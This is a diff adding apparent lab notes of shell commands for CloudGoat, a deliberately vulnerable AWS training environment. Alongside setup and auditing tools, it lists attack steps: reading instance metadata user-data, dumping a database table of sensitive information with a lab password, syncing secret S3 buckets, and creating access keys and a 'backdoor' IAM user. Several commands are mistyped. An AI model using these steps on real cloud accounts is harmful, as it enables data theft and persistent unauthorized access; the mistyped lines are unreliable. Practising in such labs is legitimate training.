@@ -1,1 +1,76 @@
+#Terraform error on running cloudgoat
+1. Run wget https://releases.hashicorp.com/terraform/1.0.10/ terraform_1.0.10_linux_amd64.zip
+2. Unzip terraform_1.0.10_linux_amd64.zip
+3. Run mv /usr/bin/terraform terraform_old
+4. Run mv terraform /usr/bin/
 
+#Running terraform scripts
+
+./cloudgoat config profile masteringkali
+./cloudgoat.py config whitelist –auto
+./cloudgoat.py create rce_web_app --profile masteringkali
+
+sudo aws configure –-profile <profilename>
+sudo aws s3 ls –-profile <profilename>
+
+#ScoutSuite
+sudo git clone https://github.com/nccgroup/ScoutSuite
+cd ScoutSuite
+sudo pip3 install –r requirements.txt
+sudo ./setup.py install
+sudo scout aws --profile <profilename>
+
+#prowler
+sudo git clone https://github.com/toniblyx/prowler
+cd prowler
+./prowler –p 
+ 
+ 
+sudo aws ec2 describe-instances --profile <Profile Name>
+sudo aws elbv2 describe-load-balancers --profile <Profile Name>
+
+sudo aws s3 cp s3://<bucket>/Path to the file>. --profile <Profile Name>--region us-east-1
+sudo aws ec2 describe-instances --profile mcduck --region us-east-1
+sudo aws s3 cp s3://<bucket>/<folder>/ .<outputfolder> --profile <Profile Name>
+
+
+sudo chmod 400 privatekey
+sudo ssh –i privatekey Ubuntu@publicDNSofEC2
+
+curl http://169.254.169.254/latest/user-data
+
+psql postgresql://cgadmin:Purplepwny2029@<rds-instance>:5432/cloudgoat
+\dt
+select * from sensitive_information
+
+sudo aws s3 ls
+sudo aws s3 ls s3://cg-secret-s3-bucket-cgid<uniqueID> --recursive
+aws s3 cp s3://cg-secret-s3-bucket-cgidzay5e3vg5r/db.txt .
+cat db.txt
+
+./cloudgoat create cloud_breach_s3
+
+sudo nano /root/.aws/credentials
+sudo aws s3 list –-profile S3exploit
+sudo aws s3 sync s3://<Name of the bucket> ./newfolder –profile S3exploit
+
+./cloudgoat destroy cloud_breach_s3
+
+ sudo aws lambda list-functions –profile ssrf –region us-east-1
+ sudo aws lambda get-function –function-name cg-lambda-cg<randomid> --profile ssrf –region us-east-1
+ sudo aws ec2 describe-instances –region us-east-1 –profile lambda-solus
+ 
+ 
+ sudoaws configure –profile ec2-temp
+ sudo aws s3 ls –profile ec2-temp
+ 
+ sudo aws s3 sync s3://<bucketname><folder><file> location –profile
+ sudo aws iam list-users –profile ec2—admin 
+ sudo iam list-attached-user-policies –username <nameofuser> --profile ec2-admin 
+ 
+ #Please be careful while you create users on the production environment
+ 
+ sudo iam create-access-key –username <Username> --region us-east-1 –profile ec2-admin
+ sudo aws iam create-user –username backdoor –profile ec2-admin
+ 
+ ./cloudgoat.py destroy all
